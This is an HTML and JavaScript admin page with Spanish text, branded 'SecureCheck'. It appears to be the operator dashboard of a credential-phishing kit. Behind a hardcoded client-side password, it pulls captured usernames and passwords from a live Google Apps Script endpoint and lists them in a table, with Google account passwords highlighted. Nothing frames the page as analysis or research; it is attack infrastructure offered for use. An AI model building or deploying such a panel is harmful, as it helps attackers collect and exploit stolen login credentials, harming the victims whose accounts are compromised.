<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PANEL CONTROL - SECURECHECK</title>
    <style>
        body { background: #0b141d; color: white; font-family: 'Segoe UI', sans-serif; padding: 20px; }
        .container { max-width: 1100px; margin: auto; }
        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        h1 { color: #38bdf8; font-weight: 300; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
        td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; vertical-align: middle; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; white-space: nowrap; }
        .badge-google { background: #0369a1; color: #7dd3fc; }
        .badge-form { background: #581c87; color: #d8b4fe; }
        .pass-cell { font-family: 'Courier New', monospace; color: #fbbf24; font-weight: bold; font-size: 15px; }
        #login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 80vh; }
        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #15202b; color: white; width: 260px; margin-bottom: 15px; outline: none; }
        button { padding: 12px 30px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #0b141d; }
        .refresh-btn { background: transparent; color: #38bdf8; border: 1px solid #38bdf8; padding: 8px 15px; font-size: 12px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div id="login-screen">
            <h1>Acceso Administrador</h1>
            <input type="password" id="admin-pass" placeholder="Contraseña">
            <button onclick="verificar()">Entrar</button>
        </div>

        <div id="dashboard" style="display:none">
            <div class="card">
                <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <h1>Registros en Tiempo Real</h1>
                    <button class="refresh-btn" onclick="cargarDatos()">🔄 Actualizar Tabla</button>
                </div>
                <table>
                    <thead>
                        <tr>
                            <th>Origen</th>
                            <th>Usuario / Empresa</th>
                            <th>Contraseña / Detalles</th>
                            <th>Fecha y Hora</th>
                        </tr>
                    </thead>
                    <tbody id="tabla-cuerpo">
                        </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        // TU URL ACTUALIZADA
        const webAppUrl = "https://script.google.com/macros/s/AKfycbxRWIPEFW1fPRg9bJEtNDISKLaojKgJu6FePHoabTxvoypQQ5euGdNw4Y0u0q0zjppa/exec";

        function verificar() {
            if(document.getElementById("admin-pass").value === "Linares2025.") {
                document.getElementById("login-screen").style.display = "none";
                document.getElementById("dashboard").style.display = "block";
                cargarDatos();
            } else {
                alert("Contraseña incorrecta");
            }
        }

        async function cargarDatos() {
            const tbody = document.getElementById("tabla-cuerpo");
            tbody.innerHTML = "<tr><td colspan='4' style='text-align:center; padding:30px;'>Cargando base de datos...</td></tr>";
            
            try {
                const response = await fetch(webAppUrl);
                const data = await response.json();
                
                tbody.innerHTML = "";
                
                // Le damos la vuelta para ver lo más reciente arriba
                data.reverse().forEach(fila => {
                    // fila[0] = Usuario/Empresa, fila[1] = Password/Detalles, fila[2] = Tipo, fila[3] = Fecha
                    const tipo = fila[2] || "DESCONOCIDO";
                    const esGoogle = tipo.includes("GOOGLE");
                    
                    const tr = document.createElement("tr");
                    tr.innerHTML = `
                        <td>
                            <span class="badge ${esGoogle ? 'badge-google' : 'badge-form'}">
                                ${tipo}
                            </span>
                        </td>
                        <td>${fila[0] || '---'}</td>
                        <td class="${esGoogle ? 'pass-cell' : ''}">${fila[1] || '---'}</td>
                        <td style="color:#64748b; font-size:12px;">${fila[3] || '---'}</td>
                    `;
                    tbody.appendChild(tr);
                });

                if (data.length === 0) {
                    tbody.innerHTML = "<tr><td colspan='4' style='text-align:center;'>No hay datos grabados todavía.</td></tr>";
                }

            } catch (error) {
                console.error(error);
                tbody.innerHTML = "<tr><td colspan='4' style='text-align:center; color:#f87171;'>Error al leer Google Sheets. Revisa la consola o la publicación del Script.</td></tr>";
            }
        }
    </script>
</body>
</html>
